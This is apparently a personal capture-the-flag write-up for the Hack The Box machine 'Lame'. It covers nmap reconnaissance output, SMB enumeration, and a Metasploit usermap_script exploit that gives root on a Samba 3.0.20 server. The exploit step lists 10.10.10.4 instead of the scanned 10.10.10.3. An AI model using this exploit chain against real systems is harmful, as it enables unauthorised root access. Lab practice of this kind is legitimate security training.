# Lame

## IP	
> 10.10.10.3

## nmap scan

```nmap -T4 -A 10.10.10.3 -Pn```

```a
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-29 00:39 EDT
Nmap scan report for 10.10.10.3
Host is up (0.055s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.16.185
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h02m27s, deviation: 2h49m43s, median: 2m26s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-07-29T00:42:26-04:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

## System Info 
>
 OS: Unix (Samba 3.0.20-Debian)
 Computer name: lame

## Open Ports
       
>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
>
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Both SMB 

>
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

SSH
> 21/tcp  open  ftp         vsftpd 2.3.4

FTP

## smbclient
```
smbclient -L ///10.10.10.3//
```

> Did not work

After Work Notes, my command was incorrect therefore I got no input, the correct command was:

```
smbclient -L \\\\10.10.10.3\\
```

## Metasploit 

### Search for SMB version 
```
msfconsole
search smb
use auxiliary/scanner/smb/smb_version
set rhost 10.10.10.3
run
```

Nothing useful 

After looking for exploits for Samba smbd 3.0.20-Debian i found this [rapid7 link](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)

### Gaining Access to the machine 
```
msfconsole
use ```
use exploit/multi/samba/usermap_script
set rhost 10.10.10.4
set lhost tun0
run
```

Now we have root access to the machine 

We can find the user flag in 

>
/home/makis
cat user.txt


We can find the root flag in 

>
/root
cat root.txt
